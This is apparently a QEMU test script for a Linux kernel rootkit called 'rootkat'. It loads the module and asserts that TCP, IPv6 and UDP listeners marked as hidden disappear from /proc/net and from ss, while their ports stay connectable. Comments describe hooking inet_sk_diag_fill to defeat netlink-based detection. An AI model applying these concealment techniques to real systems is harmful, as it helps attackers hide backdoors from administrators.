#!/usr/bin/env bash
# Asserts: a TCP listener whose port is added to rootkat's hidden-ports
# list disappears from BOTH surfaces — /proc/net/tcp{,6} (seq_file path,
# read by lsof / older netstat) AND the NETLINK_SOCK_DIAG path used by
# modern `ss`. The latter goes through inet_sk_diag_fill which we hook
# separately.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

PORT=12345

# /proc/net/tcp lists local ports as hex in column 2 (LADDR:LPORT).
# This filter extracts the LPORT column from every data row and prints
# it as decimal, one per line.
tcp_ports() {
	awk 'NR>1{split($2,a,":"); printf "%d\n", strtonum("0x" a[2])}' /proc/net/tcp
}

assert_zero "module loads" insmod lkm/rootkat.ko

# --- Baseline: a non-hiding listener appears in /proc/net/tcp ----------
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3   # waits for "ready"
BASELINE_PID=$!
sleep 0.2
assert_zero "baseline: /proc/net/tcp has port" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"
kill $BASELINE_PID 2>/dev/null || true
wait $BASELINE_PID 2>/dev/null || true
exec 3<&-
sleep 0.3   # let TIME_WAIT settle so the rebind on the same port works

# --- Hide-mode listener: invisible to /proc/net/tcp readers ------------
exec 3< <(tests/qemu/net_helper $PORT hide)
read -r LINE <&3   # "ready" arrives only after the hide kill() returns
HIDE_PID=$!
sleep 0.2

assert_nonzero "hidden: /proc/net/tcp omits port"  \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"

# Direct connect must still work — we hide from enumeration, not access.
assert_zero "hidden: still connectable" \
	bash -c "exec 4<>/dev/tcp/127.0.0.1/$PORT && exec 4<&- 4>&-"

# Netlink path: ss uses NETLINK_SOCK_DIAG → inet_sk_diag_fill (in the
# autoload-on-demand inet_diag module). Our install triggers the autoload
# via request_module then hooks the per-socket fill. Verified: ss correctly
# shows sshd:22 and systemd-resolved:53 while filtering our hidden port.
assert_nonzero "hidden: ss does NOT show port (netlink hook)" \
	bash -c "ss -tln | grep -q ':$PORT '"

kill $HIDE_PID 2>/dev/null || true
wait $HIDE_PID 2>/dev/null || true
exec 3<&-

assert_zero "module unloads" rmmod rootkat

# --- Post-unload: visibility restored -----------------------------------
sleep 0.3
exec 3< <(tests/qemu/net_helper $PORT)
read -r LINE <&3
POST_PID=$!
sleep 0.2
assert_zero "post-unload: /proc/net/tcp shows port" \
	bash -c "$(declare -f tcp_ports); tcp_ports | grep -qx $PORT"
kill $POST_PID 2>/dev/null || true
wait $POST_PID 2>/dev/null || true
exec 3<&-


# --- IPv6: same machinery, different seq_show target -------------------
V6_PORT=12346
tcp6_ports() {
	awk 'NR>1{split($2,a,":"); printf "%d\n", strtonum("0x" a[length(a)])}' /proc/net/tcp6
}

assert_zero "v6: module loads"           insmod lkm/rootkat.ko

exec 3< <(tests/qemu/net_helper $V6_PORT v6)
read -r LINE <&3
V6_BASE_PID=$!
sleep 0.2
assert_zero "v6 baseline: tcp6 has port" \
	bash -c "$(declare -f tcp6_ports); tcp6_ports | grep -qx $V6_PORT"
kill $V6_BASE_PID 2>/dev/null || true
wait $V6_BASE_PID 2>/dev/null || true
exec 3<&-
sleep 0.3

exec 3< <(tests/qemu/net_helper $V6_PORT hide v6)
read -r LINE <&3
V6_HIDE_PID=$!
sleep 0.2
assert_nonzero "v6 hidden: tcp6 omits port" \
	bash -c "$(declare -f tcp6_ports); tcp6_ports | grep -qx $V6_PORT"
kill $V6_HIDE_PID 2>/dev/null || true
wait $V6_HIDE_PID 2>/dev/null || true
exec 3<&-

assert_zero "v6: module unloads" rmmod rootkat

# --- UDP: same magic signal hides the port across UDP too ---------------
UDP_PORT=12347
udp_ports() {
	awk 'NR>1{split($2,a,":"); printf "%d\n", strtonum("0x" a[length(a)])}' /proc/net/udp
}

assert_zero "udp: module loads"           insmod lkm/rootkat.ko

exec 3< <(tests/qemu/net_helper $UDP_PORT udp)
read -r LINE <&3
UDP_BASE_PID=$!
sleep 0.2
assert_zero "udp baseline: /proc/net/udp has port" \
	bash -c "$(declare -f udp_ports); udp_ports | grep -qx $UDP_PORT"
kill $UDP_BASE_PID 2>/dev/null || true
wait $UDP_BASE_PID 2>/dev/null || true
exec 3<&-
sleep 0.3

exec 3< <(tests/qemu/net_helper $UDP_PORT hide udp)
read -r LINE <&3
UDP_HIDE_PID=$!
sleep 0.2
assert_nonzero "udp hidden: /proc/net/udp omits port" \
	bash -c "$(declare -f udp_ports); udp_ports | grep -qx $UDP_PORT"

# inet_sk_diag_fill is shared across protocols — the same hook that
# closes the TCP/ss bypass should also close the UDP/ss bypass.
assert_nonzero "udp hidden: ss -uln does NOT show port (netlink hook)" \
	bash -c "ss -uln | grep -q ':$UDP_PORT '"

kill $UDP_HIDE_PID 2>/dev/null || true
wait $UDP_HIDE_PID 2>/dev/null || true
exec 3<&-

assert_zero "udp: module unloads" rmmod rootkat

report
